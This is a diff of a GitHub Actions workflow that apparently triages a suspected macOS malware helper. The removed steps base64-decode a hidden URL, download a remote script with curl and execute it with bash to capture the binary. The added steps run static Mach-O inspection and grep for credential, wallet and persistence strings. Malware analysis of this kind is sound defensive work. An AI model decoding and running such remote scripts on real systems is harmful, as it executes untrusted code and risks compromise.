@@ -1,59 +1,99 @@
-name: Extract Helper Binary
+name: Deep Mach-O Analysis
 
 on:
   workflow_dispatch:
 
 jobs:
-  extract:
-    runs-on: ubuntu-latest
-    timeout-minutes: 10
+  analyze:
+    runs-on: macos-14
 
     steps:
-      - name: Decode URL
-        run: |
-          URL=$(echo "aHR0cHM6Ly9zYXRpbjg3LmNvbS9jdXJsLzY2MjdmMDJhN2EzNzVlZjEyYmUxMzMwMThiZDIyY2Y5MTRmNWFjYWYxMDljODc4NmIwMjk3MGNhZjFhYWU5YWU=" | base64 -d)
-          echo "URL=$URL" >> $GITHUB_ENV
+      - uses: actions/checkout@v4
 
-      - name: Download script
-        run: |
-          curl -L "$URL" -o script.sh
-          chmod +x script.sh
-
-      - name: Show script
-        run: |
-          echo "===== SCRIPT ====="
-          cat script.sh
-
-      - name: Extract helper URL
-        run: |
-          grep -aoE 'https://[^"]+' script.sh || true
-
-      - name: Execute until helper downloaded
-        continue-on-error: true
-        run: |
-          timeout 60 bash -x script.sh > runtime.log 2>&1 || true
-
-      - name: Locate helper
-        run: |
-          ls -lah /tmp || true
-
-          if [ -f /tmp/helper ]; then
-            file /tmp/helper > helper-info.txt
-            sha256sum /tmp/helper >> helper-info.txt
-          else
-            echo "helper not found" > helper-info.txt
-            exit 1
-          fi
-
-      - name: Upload helper binary
-        uses: actions/upload-artifact@v4
+      - name: Download helper
+        uses: actions/download-artifact@v4
         with:
           name: helper-binary
-          path: |
-            /tmp/helper
-            helper-info.txt
-            runtime.log
+          path: artifacts
 
-      - name: Display helper info
+      - name: Basic Information
         run: |
-          cat helper-info.txt
+          file artifacts/helper > file.txt
+          shasum -a 256 artifacts/helper > sha256.txt
+
+      - name: Code Signature
+        run: |
+          codesign -dv --verbose=4 artifacts/helper \
+            > codesign.txt 2>&1 || true
+
+      - name: Gatekeeper
+        run: |
+          spctl -a -vv artifacts/helper \
+            > spctl.txt 2>&1 || true
+
+      - name: Linked Libraries
+        run: |
+          otool -L artifacts/helper \
+            > libraries.txt 2>&1 || true
+
+      - name: Mach-O Headers
+        run: |
+          otool -hV artifacts/helper \
+            > headers.txt 2>&1 || true
+
+      - name: Load Commands
+        run: |
+          otool -l artifacts/helper \
+            > load_commands.txt 2>&1 || true
+
+      - name: Entitlements
+        run: |
+          codesign -d --entitlements :- artifacts/helper \
+            > entitlements.txt 2>&1 || true
+
+      - name: Symbols
+        run: |
+          nm -nm artifacts/helper \
+            > symbols.txt 2>&1 || true
+
+      - name: Dynamic Symbols
+        run: |
+          nm -gm artifacts/helper \
+            > dynamic_symbols.txt 2>&1 || true
+
+      - name: Embedded Strings
+        run: |
+          strings -a artifacts/helper \
+            > strings.txt
+
+      - name: Interesting Strings
+        run: |
+          grep -iE \
+          'https?://|socket|launchctl|plist|agent|daemon|loginitems|keychain|icloud|ssh|curl|wget|bash|zsh|python|osascript|appleevent|endpointsecurity|systemextension|vpn|crypto|wallet|discord|telegram|token|password|chrome|safari|firefox' \
+          strings.txt \
+          > interesting_strings.txt || true
+
+      - name: Universal Binary Info
+        run: |
+          lipo -info artifacts/helper \
+            > lipo.txt 2>&1 || true
+
+      - name: Architecture Details
+        run: |
+          otool -arch arm64 -L artifacts/helper \
+            > arm64_libs.txt 2>&1 || true
+
+          otool -arch x86_64 -L artifacts/helper \
+            > x64_libs.txt 2>&1 || true
+
+      - name: Compress Results
+        run: |
+          mkdir report
+          cp *.txt report/ || true
+          zip -r analysis-report.zip report
+
+      - name: Upload Report
+        uses: actions/upload-artifact@v4
+        with:
+          name: analysis-report
+          path: analysis-report.zip
